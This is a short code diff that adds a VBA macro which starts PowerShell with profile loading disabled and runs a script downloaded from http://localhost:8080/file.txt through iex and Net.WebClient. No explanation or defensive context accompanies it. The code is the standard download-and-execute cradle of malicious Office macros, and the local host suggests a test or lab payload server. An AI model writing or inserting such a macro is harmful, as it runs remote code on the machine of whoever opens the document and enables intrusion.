@@ -1,0 +1,10 @@
+Public Sub StartExeWithArgument()
+    Dim strProgramName As String
+    Dim strArgument As String
+    
+    strProgramName = "powershell.exe"
+    strArgument = "-nop -c ""iex(New-Object Net.WebClient).DownloadString('http://localhost:8080/file.txt')"""
+
+    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbNormalFocus)
+End Sub
+
